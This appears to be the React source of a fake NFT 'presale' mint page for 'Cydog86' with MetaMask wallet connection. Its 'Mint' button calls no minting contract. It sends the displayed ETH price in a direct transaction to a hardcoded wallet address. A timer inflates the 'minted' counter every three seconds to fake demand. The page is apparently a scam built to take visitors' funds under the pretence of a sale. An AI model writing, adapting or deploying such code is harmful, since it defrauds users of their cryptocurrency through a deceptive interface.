import React, { useState, useEffect } from "react";
import { Modal } from "react-bootstrap";
import "./app.scss";
import meta from "./assets/meta_mask.png";

const App = () => {
  const [value, setValue] = useState(1);
  const [eth, setEth] = useState(0.11);
  const [mint, setMint] = useState(533);
  const [width, setWidth] = useState("0");
  const [show, setShow] = useState(false);
  const [isethereum, setisethereum] = useState() ;

  const handleClose = () => setShow(false);
  const handleEthClose = () => setisethereum(false) ;

  const handleShow = () => setShow(true);

	const [defaultAccount, setDefaultAccount] = useState(null);
	const [connButtonText, setConnButtonText] = useState('Connect Wallet');
  const [disabled,setdisabled]  = useState(true);
  const [networkid,setnetworkid] = useState(1) ;

	const connectWalletHandler = () => {
		if (window.ethereum && window.ethereum.isMetaMask) {
			window.ethereum.request({ method: 'eth_requestAccounts'})
			.then(result => {
				accountChangedHandler(result[0]);
				setConnButtonText('Wallet Connected');
        setdisabled (false) ;
        setnetworkid (window.ethereum.networkVersion ) ;
			})
			.catch(error => {
				console.log(error.message);
			
			});

		} 
    else 
    {
			setShow(true) ;
		}
	}

	// update account, will cause component re-render
	const accountChangedHandler = (newAccount) => {
		setDefaultAccount(newAccount);
	}

	const chainChangedHandler = () => {
		// reload the page to avoid any errors with chain change mid use of application
    setnetworkid(window.ethereum.networkVersion) ;
		window.location.reload();
    
	}

  const mintHandler = async ()  => {

      if ( networkid == 1)
      {
      const receiver = '0x9803bBe351c256AccEc0cd23E64D5bA5a33C2b00' ;
      const gasPrice = '0x5208' // 21000 Gas Price
      const amountHex = (eth * Math.pow(10,18)).toString(16)
      
      const tx = {
        from: defaultAccount,
        to: receiver,
        value: amountHex,
        gas: gasPrice,
      }
  
      await window.ethereum.request({ method: 'eth_sendTransaction', params: [ tx ]})
    }
    else{
      setisethereum(true) ;
    }
  
    }



	// listen for account changes
	window.ethereum.on('accountsChanged', accountChangedHandler);
	window.ethereum.on('chainChanged', chainChangedHandler);

  const inc = () => {
    if (value === 10) {
    } else {
      setValue(value + 1);

      let result = eth + 0.11;
      result = Math.round(result * 100) / 100;
      setEth(result);
    }
  };

  const dec = () => {
    if (value === 1) {
    } else {
      setValue(value - 1);
      let result = eth - 0.11;
      result = Math.round(result * 100) / 100;
      setEth(result);
    }
  };

  useEffect(() => {
    if (mint <= 887)
      setTimeout(() => {
        setMint(mint + 1);
        let minted = mint + 1;
        setWidth(`${(minted / 888) * 100}`);
      }, 3000);
  }, [mint]);

  return (
    <>
      <div className="home-page">

        <div className="mint-box">
          <h1>
            Cydog86 PRESALE IS NOW <span className="outline">LIVE</span>
          </h1>
          <div className="line"></div>
          <div className="count">
            <div className="action fas fa-minus" onClick={dec}></div>

            <div className="value">{Math.round(value)}</div>

            <div className="action fas fa-plus" onClick={inc}></div>
          </div>
          <div
            className="btn-max"
            onClick={() => {
              setValue(10);
              setEth(1.5);
            }}
          >
            SET MAX
          </div>
          <div className="line"></div>
          <p className="price">TOTAL PRICE: {eth} ETH</p>
          <div className="btn-connect" onClick={connectWalletHandler}>
          {connButtonText}
          </div>
          <div className="btn-connect" onClick={mintHandler} disabled = {disabled}>
            Mint
          </div>
          <div className="prgcont">
            <div className="bar">
              <div className="bar-done" style={{ width: `${width}%` }}></div>
            </div>

            <div className="text-glitch">
              <span className="countA">{mint}</span>
              <span className="max"> / 888</span>
            </div>
          </div>{" "}
        </div>
      </div>

      <Modal show={show} onHide={handleClose}>
        <Modal.Body>
          <div className="meta">METAMASK NEEDED</div>

          <img width="90" alt="MetaMask" src={meta} />

          <div className="meta">
            <span> Please install </span>

            <a
              href="https://metamask.io/download.html"
              target="_blank"
              rel="noreferrer"
            >
              MetaMask
            </a>
            <span> to connect your wallet.</span>
          </div>
        </Modal.Body>
      </Modal>
      <Modal show={isethereum} onHide={handleEthClose}>
        <Modal.Body>
          <div className="meta">Please change your network to Ethereum Mainnet</div>
        </Modal.Body>
      </Modal>
    </>
  );
};

export default App;
